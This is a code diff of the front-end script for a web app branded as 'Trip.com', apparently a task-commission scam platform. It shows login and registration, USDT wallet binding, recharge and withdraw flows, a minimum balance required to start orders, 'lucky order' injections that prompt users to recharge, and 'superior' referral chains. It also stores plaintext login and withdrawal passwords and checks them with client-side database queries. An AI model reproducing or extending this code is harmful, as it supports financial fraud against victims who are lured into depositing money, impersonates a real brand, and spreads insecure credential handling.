+        if (name === 'home' && user) { subscribeNotificationsRealtime(); updateUI(); loadNotifications(); }
+        if (name === 'work' && user) { subscribeInjectionsRealtime(user.id); updateUI(); refreshWork(); }
+        if (name === 'orders' && user) updateUI();
+        if (name === 'profile' && user) updateUI();
+        if (name === 'service' && user) subscribeChatRealtime();
+        
+        startFeed();
+    }
+    document.querySelectorAll('.nav-item').forEach(el => {
+        el.onclick = () => {
+            if (!user) { showPage('landing'); return; }
+            document.querySelectorAll('.nav-item').forEach(e => e.classList.remove('active'));
+            el.classList.add('active');
+            showPage(el.dataset.page);
         };
-        await setDoc(doc(db,"users", user.id), user);
-        await saveUser();
-        subscribeAccountDeletion(user.id);
-        updateUI(); showPage('home');
-    };
+    });
 
-    // ===== GOOGLE LOGIN =====
-    document.getElementById('landingGoogleBtn').onclick = async () => {
+    // ===== EVENT LISTENERS =====
+    document.getElementById('landingGoogleBtn').onclick = handleGoogleLogin;
+    document.getElementById('loginGoogleBtn').onclick = handleGoogleLogin;
+    document.getElementById('registerGoogleBtn').onclick = handleGoogleLogin;
+    document.getElementById('landingLoginBtn').onclick = () => showPage('login');
+    document.getElementById('landingRegisterBtn').onclick = () => showPage('register');
+    document.getElementById('backFromLogin').onclick = () => showPage('landing');
+    document.getElementById('backFromRegister').onclick = () => showPage('landing');
+    document.getElementById('goRegisterBtn').onclick = () => showPage('register');
+    document.getElementById('goLoginFromReg').onclick = () => showPage('login');
+
+    // ===== AUTH: GOOGLE LOGIN =====
+    async function handleGoogleLogin() {
         try {
             const result = await signInWithPopup(auth, googleProvider);
             const gUser = result.user;
@@ -1297,6 +1610,7 @@
                 user = { id: gUser.uid, ...userSnap.data() };
                 toast(`Welcome back, ${user.username}`);
             } else {
+                const ip = await getClientIP();
                 const newUser = {
                     id: gUser.uid,
                     username: username,
@@ -1320,33 +1634,312 @@
                     currentOrderObj: null,
                     role: 'customer',
                     lastSeen: Date.now(),
-                    regIP: null
+                    authProvider: 'google',
+                    regIP: ip
                 };
                 await setDoc(userRef, newUser);
                 user = { id: gUser.uid, ...newUser };
                 toast(`Welcome, ${username}! Account created.`);
             }
-            await saveUser();
-            await loadInjections(user.id);
-            subscribeAccountDeletion(user.id);
-            updateUI(); showPage('home');
+            await finalizeLogin(user);
         } catch (error) {
             console.error("Google Login Error:", error);
             toast("Google Login failed: " + error.message, true);
         }
+    }
+
+    async function finalizeLogin(u) {
+        if (!u.orders) u.orders = [];
+        if (!u.tasks) u.tasks = { completed:0, total:0 };
+        await saveUser();
+        await loadUserData(u.id);
+        await loadInjections(u.id);
+        await loadRechargeStatus(u.id);
+        await loadNotifications();
+        startLastSeenUpdate();
+        updateUI();
+        const last = localStorage.getItem('lastPage');
+        showPage(last && !['landing','login','register'].includes(last) ? last : 'home');
+    }
+
+    // ===== LOGIN =====
+    document.getElementById('doLoginBtn').onclick = async function() {
+        const username = document.getElementById('loginUsername').value.trim();
+        const password = document.getElementById('loginPass').value;
+        if (!username || !password) { toast('Enter username and password.', true); return; }
+        this.disabled = true; this.innerHTML = '<i class="fas fa-spinner fa-pulse"></i>';
+        try {
+            const q = query(collection(db, "users"), where("username", "==", username), where("password", "==", password));
+            const snap = await getDocs(q);
+            if (snap.empty) { toast('Invalid username or password.', true); this.disabled = false; this.innerHTML = 'Login'; return; }
+            const data = snap.docs[0].data();
+            if (data.disabled) { toast('Account disabled.', true); this.disabled = false; this.innerHTML = 'Login'; return; }
+            user = { id: snap.docs[0].id, ...data };
+            if (!user.orders) user.orders = []; if (!user.tasks) user.tasks = { completed:0, total:0 };
+            await saveUser(); await loadUserData(user.id); await loadInjections(user.id); await loadRechargeStatus(user.id); await loadNotifications(); startLastSeenUpdate(); updateUI();
+            const last = localStorage.getItem('lastPage'); showPage(last && !['landing','login','register'].includes(last) ? last : 'home');
+            toast(`Welcome, ${username}`);
+        } catch (e) { console.error('Login error:', e); toast('Login failed: ' + e.message, true); }
+        this.disabled = false; this.innerHTML = 'Login';
     };
 
+    // ===== REGISTER (With Superior Referral Logic) =====
+    document.getElementById('doRegisterBtn').onclick = async function() {
+        const username = document.getElementById('regUsername').value.trim();
+        const email = document.getElementById('regEmail').value.trim();
+        const phone = document.getElementById('regPhone').value.trim();
+        const pass = document.getElementById('regPass').value;
+        const confirm = document.getElementById('regConfirm').value;
+        const withdraw = document.getElementById('regWithdraw').value;
+        const invite = document.getElementById('regInvite').value.trim();
+        if (!username || !email || !pass || !withdraw) { toast('All fields required.', true); return; }
+        if (pass !== confirm) { toast('Passwords do not match.', true); return; }
+        const exist = await getDocs(query(collection(db, "users"), where("username","==",username)));
+        if (!exist.empty) { toast('Username exists.', true); return; }
+        
+        let superior = null;
+        if (invite) { 
+            const refCheck = await getDocs(query(collection(db, "users"), where("invitationCode","==",invite))); 
+            if (refCheck.empty) { toast('Invalid invitation code.', true); return; } 
+            superior = refCheck.docs[0].data().username; 
+        }
+
+        const ip = await getClientIP();
+        user = {
+            id: Date.now().toString(), username, email, phone, password: pass, withdrawPassword: withdraw,
+            balance: 0, invitationCode: 'LXC'+Math.random().toString(36).substring(2,8).toUpperCase(),
+            superior: superior, referralEarnings: 0, regTime: new Date().toISOString(),
+            tasks: { completed:0, total:0 }, orders: [], todayOrders: 0, todayEarnings: 0, totalCommission: 0,
+            creditScore: 100, disabled: false, walletAddress: null, currentOrderObj: null, role: 'customer', lastSeen: Date.now(), regIP: ip
+        };
+        await setDoc(doc(db, "users", user.id), user); await saveUser(); await loadUserData(user.id); await loadInjections(user.id); await loadRechargeStatus(user.id); await loadNotifications(); startLastSeenUpdate(); updateUI(); showPage('home'); toast('Registration successful!');
+    };
+
+    // ===== SIGN OUT =====
+    function signOut() {
+        if (unsubChat) unsubChat(); if (unsubRecharge) unsubRecharge(); if (unsubInjections) unsubInjections(); if (unsubNotifications) unsubNotifications();
+        if (feedInterval) clearInterval(feedInterval); if (lastSeenInterval) clearInterval(lastSeenInterval);
+        const uid = user?.id; user = null; order = null; pendingInjections = []; localStorage.removeItem('uid'); if (uid) sessionStorage.removeItem(`popup_shown_${uid}`);
+        firebaseSignOut(auth).then(() => console.log("Signed out")).catch(e => console.error("Sign out error:", e));
+        showPage('landing'); toast('Signed out.');
+    }
+    document.getElementById('signOutHome').onclick = signOut;
+    document.getElementById('signOutProfile').onclick = signOut;
+
+    // ===== REFRESH =====
+    document.querySelectorAll('.icon-btn').forEach(el => {
+        if (el.id && el.id.startsWith('refresh')) {
+            el.onclick = async () => {
+                if (user) { await loadUserData(user.id); await loadInjections(user.id); await loadRechargeStatus(user.id); await loadNotifications(); updateUI(); toast('Refreshed!'); }
+            };
+        }
+    });
+
+    // ===== BUTTONS =====
+    document.getElementById('rechargeBtn').onclick = () => user ? showRechargeModal() : toast('Login first.', true);
+    document.getElementById('withdrawBtn').onclick = () => user ? showWithdrawModal() : toast('Login first.', true);
+    document.getElementById('depositBtn').onclick = () => user ? showRechargeModal() : toast('Login first.', true);
+    document.getElementById('withdrawProfileBtn').onclick = () => user ? showWithdrawModal() : toast('Login first.', true);
+    document.getElementById('bindWalletBtn').onclick = () => user ? showBindWallet() : toast('Login first.', true);
+    document.getElementById('personalDetailsBtn').onclick = () => user ? showPersonalDetails() : toast('Login first.', true);
+    document.getElementById('loanBtn').onclick = () => user ? showLoanModal() : toast('Login first.', true);
+
+    document.getElementById('rechargeHistoryBtn').onclick = async () => {
+        if (!user) return;
+        const snap = await getDocs(query(collection(db,"rechargeRequests"), where("userId","==",user.id)));
+        const items = []; snap.forEach(d => items.push(d.data())); showHistory('Recharge History', items, 'recharge');
+    };
+    document.getElementById('withdrawHistoryBtn').onclick = async () => {
+        if (!user) return;
+        const snap = await getDocs(query(collection(db,"withdrawRequests"), where("userId","==",user.id)));
+        const items = []; snap.forEach(d => items.push(d.data())); showHistory('Withdraw History', items, 'withdraw');
+    };
+
+    // ===== START ORDER =====
+    document.getElementById('startOrderBtn').onclick = async () => {
+        if (!user) { toast('Login first.', true); return; }
+        const limit = user.tasks?.total || 0; const done = user.tasks?.completed || 0;
+        if (limit === 0) { toast('No orders assigned.', true); return; }
+        if (done >= limit) { toast('All orders completed!', true); return; }
+        const settings = await getDoc(doc(db, "systemSettings", "main"));
+        const minBal = settings.exists() ? (settings.data().minBalanceForOrder || 10) : 10;
+        if ((user.balance||0) < minBal) { toast(`Minimum balance $ ${minBal} required.`, true); return; }
+        subscribeInjectionsRealtime(user.id);
+        loadNextOrder();
+    };
+
+    // ===== CHAT =====
+    document.getElementById('sendChatBtn').onclick = async () => {
+        const input = document.getElementById('chatInput');
+        const text = input.value.trim();
+        if (text && user) { await sendChat(text); input.value = ''; input.focus(); }
+    };
+    document.getElementById('chatInput').addEventListener('keypress', async (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); const input = document.getElementById('chatInput'); const text = input.value.trim(); if (text && user) { await sendChat(text); input.value = ''; input.focus(); } }
+    });
+
+    document.getElementById('companyInfoBtn').onclick = () => {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `<div class="modal-box"><div class="modal-title"><i class="fas fa-info-circle"></i> ${d.companyTitle}</div>
+            <div style="text-align:center;margin:12px 0;"><i class="fas fa-globe-asia" style="font-size:48px;color:var(--secondary);"></i></div>
+            <div style="color:var(--text-secondary);font-size:14px;line-height:1.7;">Trip.com is a premier travel and task platform.</div>
+            <button class="btn-primary" id="companyClose">${d.close}</button></div>`;
+        document.body.appendChild(modal);
+        modal.querySelector('#companyClose').onclick = () => document.body.removeChild(modal);
+    };
+
+    document.querySelectorAll('.lang-opt').forEach(el => { el.onclick = function() { applyLang(this.dataset.lang); if (user) updateUI(); }; });
+
+    function showHistory(title, items, type) {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        let html = `<div class="modal-box"><div class="modal-title"><i class="fas fa-history"></i> ${title}</div>`;
+        if (items.length === 0) html += `<p style="color:var(--muted);text-align:center;padding:16px;">${d.noRecords}</p>`;
+        else items.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)).forEach(item => {
+            html += `<div class="history-item"><div class="flex"><strong style="font-size:13px;">${type==='recharge'?'Recharge':'Withdraw'}</strong><span style="color:${item.status==='pending'?'#f59e0b':item.status==='approved'?'#10b981':'#dc2626'};font-size:11px;">${item.status.toUpperCase()}</span></div><div style="font-size:13px;">Amount: $ ${item.amount}</div><div style="font-size:11px;color:var(--muted);">${new Date(item.timestamp).toLocaleString()}</div></div>`;
+        });
+        html += `<button class="btn-primary" id="historyCloseBtn">${d.close}</button></div>`;
+        modal.innerHTML = html;
+        document.body.appendChild(modal);
+        modal.querySelector("#historyCloseBtn").onclick = () => document.body.removeChild(modal);
+    }
+
+    function showBindWallet() {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `<div class="modal-box"><div class="modal-title"><i class="fas fa-link"></i> ${d.bindWallet}</div><input type="text" class="input-glass" id="bindWalletInput" placeholder="USDT TRC20 Address" value="${user?.walletAddress||''}"><button class="btn-primary" id="bindWalletSave">${d.submit}</button><button class="btn-primary btn-outline" id="bindWalletCancel" style="margin-top:8px;">${d.cancel}</button></div>`;
+        document.body.appendChild(modal);
+        modal.querySelector("#bindWalletSave").onclick = async () => {
+            user.walletAddress = modal.querySelector("#bindWalletInput").value.trim();
+            await saveUser(); updateUI(); document.body.removeChild(modal); toast("Wallet updated!");
+        };
+        modal.querySelector("#bindWalletCancel").onclick = () => document.body.removeChild(modal);
+    }
+
+    function showPersonalDetails() {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `<div class="modal-box"><div class="modal-title"><i class="fas fa-id-card"></i> ${d.personalDetails}</div><div class="flex" style="font-size:13px;padding:6px 0;border-bottom:1px solid var(--border);"><span style="color:var(--muted);">Credit:</span><span>${user?.creditScore||100}</span></div><div class="flex" style="font-size:13px;padding:6px 0;border-bottom:1px solid var(--border);"><span style="color:var(--muted);">Balance:</span><span>$ ${(user?.balance||0).toFixed(2)}</span></div><div class="flex" style="font-size:13px;padding:6px 0;"><span style="color:var(--muted);">Invitation Code:</span><span>${user?.invitationCode||'N/A'}</span></div><button class="btn-primary" id="detailsClose" style="margin-top:12px;">${d.close}</button></div>`;
+        document.body.appendChild(modal);
+        modal.querySelector("#detailsClose").onclick = () => document.body.removeChild(modal);
+    }
+
+    function showLoanModal() {
+        const d = t[lang] || t.en;
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `<div class="modal-box"><div class="modal-title"><i class="fas fa-hand-holding-usd"></i> ${d.loanService}</div><input type="number" class="input-glass" id="loanAmt" placeholder="Loan Amount"><button class="btn-primary" id="loanSubmit">${d.submit}</button><button class="btn-primary btn-outline" id="loanCancel" style="margin-top:8px;">${d.cancel}</button><div id="loanMsg" style="text-align:center;margin-top:6px;font-size:13px;"></div></div>`;
+        document.body.appendChild(modal);
+        modal.querySelector("#loanSubmit").onclick = async () => {
+            const amt = parseFloat(modal.querySelector("#loanAmt").value);
+            if (isNaN(amt) || amt <= 0) { modal.querySelector("#loanMsg").innerHTML = '<span style="color:#dc2626;">Enter valid amount.</span>'; return; }
+            await setDoc(doc(db, "loanRequests", Date.now().toString()), { id: Date.now().toString(), userId: user.id, userName: user.username, amount: amt, status: 'pending', timestamp: new Date().toISOString() });
+            document.body.removeChild(modal); toast("Loan submitted!");
+        };
+        modal.querySelector("#loanCancel").onclick = () => document.body.removeChild(modal);
+    }
+
+    // ===== TRANSLATIONS =====
+    const t = {
+        en: {
+            heroTitle:"Trip.com", heroSubtitle:"Travel & earn daily commissions.",
+            s1:"Flights", s1d:"Worldwide", s2:"Hotels", s2d:"Luxury deals", s3:"Trains", s3d:"Premium", s4:"Tasks", s4d:"Earn up to 1%",
+            loginBtn:"Login", registerBtn:"Register", aboutText:"About",
+            backLogin:"Back", backReg:"Back", loginTagline:"Premium Task Ecosystem", forgotText:"Forgot Password?",
+            regTitle:"Create Account", regNow:"Register Now", haveAccount:"Have account?",
+            welcome:"Welcome", vipLabel:"VIP", balanceLabel:"Account Balance",
+            rateLabel:"Rate", todayLabel:"Today", todayEarnLabel:"Today's Earnings", yesterdayLabel:"Yesterday",
+            totalCommLabel:"Total Commission", rechargeText:"Recharge", withdrawText:"Withdraw", refLabel:"Referral Code",
+            liveLabel:"Live Updates", exitText:"Exit", workTitle:"Tasks", progressLabel:"Task Progress", startOrder:"Start Order",
+            orderTitle:"History", profileTitle:"Profile", creditLabel:"Credit", totalAssets:"Total Assets",
+            todayOrders:"Today's Orders", todayEarnings:"Today's Earnings", totalCommission:"Total Commission",
+            depositText:"Deposit", withdrawProfileText:"Withdraw", bindWallet:"Bind Wallet", personalDetails:"Personal Details",
+            loanService:"Loan Service", rechargeHist:"Recharge History", withdrawHist:"Withdraw History", walletLabel:"Wallet",
+            langLabel:"Language", signOut:"Sign Out", serviceTitle:"Support", sendText:"Send",
+            navHome:"Home", navWork:"Work", navOrders:"Orders", navProfile:"Profile", navService:"Service",
+            orderAmount:"Order Amount", profitEarned:"Profit", afterBalance:"After Balance",
+            serviceQuality:"Service Quality", productQuality:"Product Quality", salesExperience:"Sales Experience",
+            submitComplete:"Submit & Complete", processing:"Processing...", insufficient:"Insufficient Balance!",
+            yourBalance:"Your Balance", needAdditional:"Need Additional", rechargeNow:"Recharge Now",
+            close:"Close", submit:"Submit", cancel:"Cancel", uploadReceipt:"Upload receipt",
+            enterAmount:"Enter valid amount", noRecords:"No records.",
+            companyTitle:"About Trip.com", mission:"Our Mission", vision:"Our Vision",
+            pendingOrder:"Pending Order!", pendingMsg:"Complete your current order first.",
+            okay:"Okay", warning:"Warning", completed:"Completed", walletAddr:"USDT TRC20 Address", copy:"Copy",
+            uploadPhoto:"Upload Photo", save:"Save",
+            bonusOrder:"LUCKY ORDER!", injectionMsg:"You've been selected for a special task with boosted rewards!",
+            referralEarned:"Referral Bonus Earned!",
+            rechargeWaiting:"Please wait, we are checking your payment."
+        }
+    };
+
+    function applyLang(l) {
+        lang = l;
+        localStorage.setItem('lang', l);
+        const d = t[l] || t.en;
+        document.querySelectorAll('.lang-opt').forEach(el => { el.classList.toggle('active', el.dataset.lang === l); });
+        const map = {
+            heroTitle:d.heroTitle, heroSubtitle:d.heroSubtitle,
+            s1:d.s1, s1d:d.s1d, s2:d.s2, s2d:d.s2d, s3:d.s3, s3d:d.s3d, s4:d.s4, s4d:d.s4d,
+            loginBtn:d.loginBtn, registerBtn:d.registerBtn, aboutText:d.aboutText,
+            backLogin:d.backLogin, backReg:d.backReg, loginTagline:d.loginTagline, forgotText:d.forgotText,
+            regTitle:d.regTitle, regNow:d.regNow, haveAccount:d.haveAccount,
+            welcome:d.welcome, vipLabel:d.vipLabel, balanceLabel:d.balanceLabel,
+            rateLabel:d.rateLabel, todayLabel:d.todayLabel, todayEarnLabel:d.todayEarnLabel, yesterdayLabel:d.yesterdayLabel,
+            totalCommLabel:d.totalCommLabel, rechargeText:d.rechargeText, withdrawText:d.withdrawText, refLabel:d.refLabel,
+            liveLabel:d.liveLabel, exitText:d.exitText, workTitle:d.workTitle, progressLabel:d.progressLabel, startOrder:d.startOrder,
+            orderTitle:d.orderTitle, profileTitle:d.profileTitle, creditLabel:d.creditLabel,
+            totalAssets:d.totalAssets, todayOrders:d.todayOrders, todayEarnings:d.todayEarnings, totalCommission:d.totalCommission,
+            depositText:d.depositText, withdrawProfileText:d.withdrawProfileText, bindWallet:d.bindWallet, personalDetails:d.personalDetails,
+            loanService:d.loanService, rechargeHist:d.rechargeHist, withdrawHist:d.withdrawHist, walletLabel:d.walletLabel,
+            langLabel:d.langLabel, signOut:d.signOut, serviceTitle:d.serviceTitle, sendText:d.sendText,
+            navHome:d.navHome, navWork:d.navWork, navOrders:d.navOrders, navProfile:d.navProfile, navService:d.navService,
+            orderAmount:d.orderAmount, profitEarned:d.profitEarned, afterBalance:d.afterBalance,
+            serviceQuality:d.serviceQuality, productQuality:d.productQuality, salesExperience:d.salesExperience,
+            submitComplete:d.submitComplete, processing:d.processing, insufficient:d.insufficient,
+            yourBalance:d.yourBalance, needAdditional:d.needAdditional, rechargeNow:d.rechargeNow,
+            close:d.close, submit:d.submit, cancel:d.cancel, uploadReceipt:d.uploadReceipt,
+            enterAmount:d.enterAmount, noRecords:d.noRecords
+        };
+        for (const [id, val] of Object.entries(map)) {
+            const el = document.getElementById(id);
+            if (el) el.innerText = val;
+        }
+        if (user) updateUI();
+    }
+
     // ===== INIT =====
-    const saved = localStorage.getItem('uid');
-    if(saved) {
-        (async () => {
-            await loadUserData(saved);
-            if(user && !user.disabled){ 
-                await loadInjections(user.id); 
-                subscribeAccountDeletion(user.id); 
-                updateUI(); showPage('home'); 
+    applyLang(lang);
+    startFeed();
+
+    onAuthStateChanged(auth, async (gUser) => {
+        if (gUser) {
+            const snap = await getDoc(doc(db, "users", gUser.uid));
+            if (snap.exists() && !user) {
+                const data = snap.data();
+                if (!data.disabled) {
+                    user = { id: snap.id, ...data }; if (!user.orders) user.orders = []; if (!user.tasks) user.tasks = { completed:0, total:0 };
+                    await loadUserData(user.id); await loadInjections(user.id); await loadRechargeStatus(user.id); await loadNotifications(); startLastSeenUpdate(); updateUI();
+                    const last = localStorage.getItem('lastPage'); showPage(last && !['landing','login','register'].includes(last) ? last : 'home');
+                }
             }
-            else showPage('landing');
+        }
+    });
+
+    const saved = localStorage.getItem('uid');
+    if (saved) {
+        (async () => {
+            const snap = await getDoc(doc(db, "users", saved));
+            if (snap.exists() && !snap.data().disabled) {
+                user = { id: snap.id, ...snap.data() }; if (!user.orders) user.orders = []; if (!user.tasks) user.tasks = { completed:0, total:0 };
+                await loadUserData(user.id); await loadInjections(user.id); await loadRechargeStatus(user.id); await loadNotifications(); startLastSeenUpdate(); updateUI();
+                const last = localStorage.getItem('lastPage'); showPage(last && !['landing','login','register'].includes(last) ? last : 'home');
+            } else showPage('landing');
         })();
     } else showPage('landing');
 </script>
